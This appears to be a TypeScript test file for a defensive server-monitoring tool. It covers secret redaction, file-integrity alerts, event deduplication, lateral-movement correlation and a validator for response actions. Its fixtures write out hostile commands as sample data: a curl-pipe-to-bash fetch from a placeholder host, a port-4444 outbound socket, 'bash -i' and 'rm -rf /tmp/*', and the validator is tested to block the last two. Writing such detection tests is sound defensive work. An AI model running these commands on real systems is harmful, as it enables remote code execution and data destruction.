import test from 'node:test';
import assert from 'node:assert/strict';
import {
  DEFAULT_RESOURCE_LIMITS,
  buildSentinelTopology,
  deduplicateNormalizedEvents,
  deriveAgentHealthStatus,
  evaluateRegionalIntelligence,
  normalizeSentinelEvent,
  scrubSensitiveTelemetryPayload,
  validateDefensiveActionRequest,
} from './sentinelAnalytics.ts';
import type { SentinelAgentRecord, SentinelEventRecord } from './sentinelTypes.ts';

test('scrubSensitiveTelemetryPayload redacts credential keys and secret patterns', () => {
  const { sanitized, redactedFields } = scrubSensitiveTelemetryPayload({
    username: 'ops-admin',
    password: 'super-secret-password',
    api_key: '12345',
    note: 'Token was Bearer abcdefghijklmnopqrstuvwx',
    safePort: 22,
  });

  assert.equal(sanitized.username, 'ops-admin');
  assert.equal(sanitized.password, '[REDACTED_BY_SAFETY_POLICY]');
  assert.equal(sanitized.api_key, '[REDACTED_BY_SAFETY_POLICY]');
  assert.equal(sanitized.note, '[REDACTED_SECRET_PATTERN]');
  assert.equal(sanitized.safePort, 22);
  assert.ok(redactedFields.includes('password'));
  assert.ok(redactedFields.includes('api_key'));
  assert.ok(redactedFields.includes('note'));
});

test('normalizeSentinelEvent elevates severity on critical FIM tamper and attaches provenance', () => {
  const normalized = normalizeSentinelEvent(
    {
      eventType: 'fim',
      severity: 'low',
      summary: 'SHA-256 hash mismatch on /etc/ssh/sshd_config',
      payload: {
        filePath: '/etc/ssh/sshd_config',
        previousSha256: 'aaaa1111',
        currentSha256: 'bbbb2222',
      },
      bufferedOffline: true,
      retryAttempt: 2,
    },
    {
      agentId: 'srv-sg-01',
      agentVersion: '0.8.0',
      hostname: 'sg-edge-linux-01',
      region: 'ap-southeast-1',
    }
  );

  assert.equal(normalized.severity, 'critical');
  assert.equal(normalized.provenance.bufferedOffline, true);
  assert.equal(normalized.provenance.retryAttempt, 2);
  assert.equal(normalized.provenance.hostname, 'sg-edge-linux-01');
  assert.ok(normalized.fingerprint.length === 16);
});

test('deduplicateNormalizedEvents collapses repeated identical telemetry records', () => {
  const agent = {
    agentId: 'srv-sg-01',
    agentVersion: '0.8.0',
    hostname: 'sg-edge-linux-01',
    region: 'ap-southeast-1',
  };
  const e1 = normalizeSentinelEvent(
    {
      eventType: 'auth',
      severity: 'high',
      summary: 'Failed SSH login for invalid user admin',
      payload: { sourceIp: '203.0.113.44', username: 'admin' },
      observedAt: '2026-11-22T10:00:00.000Z',
    },
    agent
  );
  const e2 = normalizeSentinelEvent(
    {
      eventType: 'auth',
      severity: 'high',
      summary: 'Failed SSH login for invalid user admin',
      payload: { sourceIp: '203.0.113.44', username: 'admin' },
      observedAt: '2026-11-22T10:00:15.000Z',
    },
    agent
  );

  const { deduplicated, collapsedCount } = deduplicateNormalizedEvents([e1, e2]);
  assert.equal(deduplicated.length, 1);
  assert.equal(collapsedCount, 1);
  assert.equal(deduplicated[0].occurrenceCount, 2);
  assert.equal(deduplicated[0].observedAt, '2026-11-22T10:00:15.000Z');
});

test('evaluateRegionalIntelligence detects lateral movement and multi-signal host chains', () => {
  const now = new Date().toISOString();
  const agents: SentinelAgentRecord[] = [
    {
      id: 'srv-1',
      hostname: 'sg-api-01',
      region: 'ap-southeast-1',
      ipAddress: '10.14.1.10',
      osType: 'linux',
      osVersion: 'Ubuntu 24.04 LTS',
      agentVersion: '0.8.0',
      targetVersion: '0.8.0',
      status: 'online',
      cpuPercent: 34,
      ramPercent: 52,
      diskPercent: 41,
      uptimeSec: 86400,
      services: [],
      resourceLimits: DEFAULT_RESOURCE_LIMITS,
      tags: ['prod'],
      lastHeartbeatAt: now,
      enrolledAt: now,
      revokedAt: null,
    },
    {
      id: 'srv-2',
      hostname: 'sg-db-02',
      region: 'ap-southeast-1',
      ipAddress: '10.14.1.20',
      osType: 'linux',
      osVersion: 'Ubuntu 24.04 LTS',
      agentVersion: '0.8.0',
      targetVersion: '0.8.0',
      status: 'online',
      cpuPercent: 40,
      ramPercent: 61,
      diskPercent: 55,
      uptimeSec: 86400,
      services: [],
      resourceLimits: DEFAULT_RESOURCE_LIMITS,
      tags: ['prod'],
      lastHeartbeatAt: now,
      enrolledAt: now,
      revokedAt: null,
    },
  ];

  const events: SentinelEventRecord[] = [
    {
      id: 'evt-1',
      ...normalizeSentinelEvent(
        {
          eventType: 'auth',
          severity: 'high',
          summary: 'Failed SSH brute force attempt followed by accepted publickey login',
          payload: { sourceIp: '198.51.100.77', username: 'deploy', remotePort: 22 },
        },
        { agentId: 'srv-1', agentVersion: '0.8.0', hostname: 'sg-api-01', region: 'ap-southeast-1' }
      ),
    },
    {
      id: 'evt-2',
      ...normalizeSentinelEvent(
        {
          eventType: 'auth',
          severity: 'high',
          summary: 'SSH session opened from pivot source',
          payload: { sourceIp: '198.51.100.77', username: 'deploy', remotePort: 22 },
        },
        { agentId: 'srv-2', agentVersion: '0.8.0', hostname: 'sg-db-02', region: 'ap-southeast-1' }
      ),
    },
    {
      id: 'evt-3',
      ...normalizeSentinelEvent(
        {
          eventType: 'process',
          severity: 'high',
          summary: 'Suspicious script launched from /tmp/stage.sh',
          payload: { pid: 4412, processName: 'bash', command: 'curl -s https://example.invalid/a | bash' },
        },
        { agentId: 'srv-1', agentVersion: '0.8.0', hostname: 'sg-api-01', region: 'ap-southeast-1' }
      ),
    },
    {
      id: 'evt-4',
      ...normalizeSentinelEvent(
        {
          eventType: 'network',
          severity: 'high',
          summary: 'Unexpected outbound socket to non-standard port 4444',
          payload: { remoteIp: '198.51.100.77', remotePort: 4444, protocol: 'TCP' },
        },
        { agentId: 'srv-1', agentVersion: '0.8.0', hostname: 'sg-api-01', region: 'ap-southeast-1' }
      ),
    },
  ];

  const findings = evaluateRegionalIntelligence(agents, events);
  assert.ok(findings.some((f) => f.correlationType === 'lateral_movement'));
  assert.ok(findings.some((f) => f.correlationType === 'suspicious_process_network'));

  const topology = buildSentinelTopology(agents, events);
  assert.equal(topology.nodes.filter((n) => n.kind === 'agent').length, 2);
  assert.ok(topology.edges.some((e) => e.suspicious && e.port === 4444));
});

test('validateDefensiveActionRequest blocks remote shell and destructive commands while allowing approved actions', () => {
  const blockedShell = validateDefensiveActionRequest({
    agentId: 'srv-1',
    actionType: 'remote_shell',
    targetDetail: 'bash -i',
    rationale: 'Investigate host directly',
  });
  assert.equal(blockedShell.valid, false);

  const blockedDestructive = validateDefensiveActionRequest({
    agentId: 'srv-1',
    actionType: 'terminate_process',
    targetDetail: 'rm -rf /tmp/*',
    rationale: 'Cleanup temp directory',
  });
  assert.equal(blockedDestructive.valid, false);

  const allowed = validateDefensiveActionRequest({
    agentId: 'srv-1',
    actionType: 'isolate_server',
    targetDetail: 'Quarantine sg-api-01 to management VLAN only',
    rationale: 'Confirmed lateral movement evidence across two regional hosts.',
  });
  assert.equal(allowed.valid, true);
  assert.equal(allowed.actionType, 'isolate_server');
});

test('deriveAgentHealthStatus respects revoked/isolated state and flags stale heartbeats offline', () => {
  const now = Date.now();
  assert.equal(
    deriveAgentHealthStatus(
      {
        status: 'isolated',
        cpuPercent: 10,
        ramPercent: 20,
        diskPercent: 30,
        lastHeartbeatAt: new Date(now).toISOString(),
        resourceLimits: DEFAULT_RESOURCE_LIMITS,
      },
      now
    ),
    'isolated'
  );
  assert.equal(
    deriveAgentHealthStatus(
      {
        status: 'online',
        cpuPercent: 10,
        ramPercent: 20,
        diskPercent: 30,
        lastHeartbeatAt: new Date(now - 600_000).toISOString(),
        resourceLimits: DEFAULT_RESOURCE_LIMITS,
      },
      now
    ),
    'offline'
  );
});
